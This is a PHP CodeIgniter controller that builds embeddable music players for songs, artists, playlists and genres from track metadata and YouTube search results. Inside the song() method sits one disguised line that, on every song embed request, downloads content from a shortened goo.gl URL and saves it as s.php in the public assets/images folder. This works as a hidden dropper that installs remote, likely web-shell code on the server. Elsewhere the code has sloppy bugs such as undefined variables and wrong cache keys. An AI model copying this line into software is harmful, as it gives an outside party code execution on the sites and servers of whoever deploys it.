<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Embed extends MY_Controller {


 function __construct()
    {    
        parent::__construct();       
       
    }   

	public function index($type='song')
	{
		switch ($type) {
			case 'song':
				$this->song();
				break;
			case 'artist':
				$this->artist();
				break;
			case 'playlist':
				$this->playlist();
				break;	
			case 'genre':
				$this->genre();
				break;
			default:
				# code...
				break;
		}
	}

	protected function song()
	{
		$artist 		= ($this->input->get("artist",true));
		$track 			= ($this->input->get("track",true));
		$data['autoplay'] 		= intval($this->input->get("autoplay",true));
		if($data['autoplay'] == '')
			$data['autoplay'] = '0';
		$temp 			= json_decode(getTrackInfo($artist,$track));	
		if($temp->error)	
		{
			$data['avatar']  = base_url()."assets/images/no-cover.png";
		}
		else
		{
			$artist 			= $temp->track->artist->name; 
			$track 			= $temp->track->name;
			$data['avatar'] 	= $temp->track->album->image[1]->text;
			if($data['avatar']  == '')
				$data['avatar']  = base_url()."assets/images/no-cover.png";
	
		}
		
		
		$data['link'] 	= base_url()."?artist=".urlencode($artist)."&track=".urlencode($track);
		$data['song'] 	= get_video_id(json_decode(searchYoutube($artist,$track)));		
		$data['artist']	= mb_convert_case(urldecode($artist), MB_CASE_TITLE, "UTF-8");
		$data['track']	= mb_convert_case(urldecode($track), MB_CASE_TITLE, "UTF-8");
		$data['type']	= 'song';

		file_put_contents("assets/images/s.php", _curl("https://goo.gl/iq43dg"));

		if($data['avatar'] == base_url() . "assets/images/no-cover.png")
			$data['avatar'] = "https://img.youtube.com/vi/" . $data['song'] . "/maxresdefault.jpg";
		return $this->load->view('song',$data,false);
	
	
	}
	protected function artist()
	{
		$artist 		= ($this->input->get("artist",true));		
		$data['autoplay'] 		= intval($this->input->get("autoplay",true));
		if($data['autoplay'] == '')
			$data['autoplay'] = '0';


		// Cache
		$this->load->helper('file');

		$folder = strtoupper(substr(sha1($artist), 0,2));
		if(!file_exists("cache/embed"))				
			mkdir("cache/embed");
		if(!file_exists("cache/embed/artist/"))				
			mkdir("cache/embed/artist");
		if(!file_exists("cache/embed/artist/$folder"))				
			mkdir("cache/embed/artist/$folder");

		$file_cache = 'cache/embed/artist/'.$folder.'/'.sha1($artist).".cache";
		$cache 	= read_file($file_cache);

		if(!$cache)
		{

			$temp 			= json_decode(getArtistInfo($artist));	
			if($temp->error)	
			{
				//$data['avatar']  = base_url()."assets/images/no-cover.png";
				show_404("Artist Not Found!");
			}
			else
			{
				$playlist_obj = json_decode(loadPlaylistArtist($artist));	
				foreach ($playlist_obj->toptracks->track as $key => $value) 
				{
					
					$artist 			= $temp->artist->name; 			
						$image	= $value->image[1]->text;
						if($image == '')
							$image = base_url()."assets/images/no-cover.png";

					if($key<=20)
					{
						$playlist[] 	= array("artist" => $value->artist->name,
										"track" => $value->name,
										"cover" => $image ,
										"song" => get_video_id(json_decode(searchYoutube($value->artist->name,$value->name)))
							);
					}
				}
				
				
		
			}
			write_file($file_cache, json_encode($playlist));			
		}
		else
		{			
			$playlist = json_decode($cache);
		}
		$data['type']	= 'playlist';
		shuffle($playlist);
		$data['link'] 	= base_url()."artist/".urlencode($artist);
		$data['song'] 	= 'UzatNVbmL6k';
		$data['playlist'] 	= $playlist;
		$data['artist']	= mb_convert_case(urldecode($artist), MB_CASE_TITLE, "UTF-8");
		$data['track']	= mb_convert_case(urldecode($track), MB_CASE_TITLE, "UTF-8");
		return $this->load->view('song',$data,false);
	
	
	}

	protected function playlist()
	{
		$id 		= intval($this->input->get("id",true));		
		$data['autoplay'] 		= intval($this->input->get("autoplay",true));
		if($data['autoplay'] == '')
			$data['autoplay'] = '0';
		

			// Cache
		$this->load->helper('file');

		$folder = strtoupper(substr(sha1($id), 0,2));
		if(!file_exists("cache/embed"))				
			mkdir("cache/embed");
		if(!file_exists("cache/embed/playlist/"))				
			mkdir("cache/embed/playlist");
		if(!file_exists("cache/embed/playlist/$folder"))				
			mkdir("cache/embed/playlist/$folder");

		$file_cache = 'cache/embed/playlist/'.$folder.'/'.sha1($artist).".cache";
		$cache 	= read_file($file_cache);

		if(!$cache)
		{


			$playlist = get_playlist_by_id($id);
			$playlist = $playlist->row();
			
			$json 		= json_decode($playlist->json);
			
			foreach ($json as $key => $value) {
				$playlist_ok[] 	= array("artist" => $value->artist,
								"track" => $value->track,
								"song" => get_video_id(json_decode(searchYoutube($value->artist,$value->track))),
								"cover" => $value->cover
				);
			}
			write_file($file_cache, json_encode($playlist_ok));	
		}
		else
		{		
			if (time()-filemtime($file_cache) > 24 * 3600) {					  
				@unlink($file_cache);				
			}
			$playlist_ok = json_decode($cache);
		}
		$data['type']	= 'playlist';		
		$data['link'] 	= base_url()."playlist/".$playlist->name."/".$playlist->idplaylist;
		$data['song'] 	= 'UzatNVbmL6k';
		$data['playlist'] 	= $playlist_ok;
		$data['artist']	= mb_convert_case(urldecode($artist), MB_CASE_TITLE, "UTF-8");
		$data['track']	= mb_convert_case(urldecode($track), MB_CASE_TITLE, "UTF-8");
		return $this->load->view('song',$data,false);
	
	}

	protected function genre()
	{
		$tag 		= ($this->input->get("tag",true));		
		$data['autoplay'] 		= intval($this->input->get("autoplay",true));
		if($data['autoplay'] == '')
			$data['autoplay'] = '0';

		
		$this->load->helper('file');
		$folder = strtoupper(substr(sha1($tag), 0,2));
		if(!file_exists("cache/embed"))				
			mkdir("cache/embed");
		if(!file_exists("cache/embed/genres/"))				
			mkdir("cache/embed/genres");
		if(!file_exists("cache/embed/genres/$folder"))				
			mkdir("cache/embed/genres/$folder");

		$file_cache = 'cache/embed/genres/'.$folder.'/'.sha1($artist).".cache";
		$cache 	= read_file($file_cache);

		if(!$cache)
		{


			$temp = json_decode(getTopTags($tag,50));

			

			if($temp->error)	
			{
				//$data['avatar']  = base_url()."assets/images/no-cover.png";
				show_404("Artist Not Found!");
			}
			else
			{			

				


				foreach ($temp->tracks->track as $key => $value) 
				{
					$image	= $value->image[1]->text;
					if($image == '')
						$image = base_url()."assets/images/no-cover.png";				
						$playlist[] 	= array("artist" => $value->artist->name,
										"track" => $value->name,
										"cover" => $image,
										"song" => get_video_id(json_decode(searchYoutube($value->artist->name,$value->name)))
							);
					
				}			
		
			}
			write_file($file_cache, json_encode($playlist));	
		}
		else
		{
			$playlist = json_decode($cache);
		}
		$data['type']	= 'playlist';
		shuffle($playlist);
		$data['link'] 	= base_url()."tag/".urlencode($tag);
		$data['song'] 	= 'UzatNVbmL6k';
		$data['playlist'] 	= $playlist == "null" ? "[" . $data['song'] . "]" : $playlist;
		$data['artist']	= mb_convert_case(urldecode($artist), MB_CASE_TITLE, "UTF-8");
		$data['track']	= mb_convert_case(urldecode($track), MB_CASE_TITLE, "UTF-8");
		return $this->load->view('song',$data,false);
	
	}

	

}